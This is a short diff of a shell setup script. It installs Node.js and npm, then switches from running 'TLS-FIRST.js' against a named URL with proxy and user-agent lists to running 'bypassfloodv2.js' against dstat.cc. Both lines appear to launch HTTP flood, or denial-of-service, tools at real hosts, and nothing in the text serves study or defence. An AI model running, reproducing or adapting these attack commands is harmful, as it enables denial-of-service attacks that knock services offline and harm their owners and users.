@@ -6,5 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://fedex.sinfo4.date/223407646 3000 proxy.txt ua.txt 13 100
-
+node bypassfloodv2.js https://dstat.cc/ 100 100
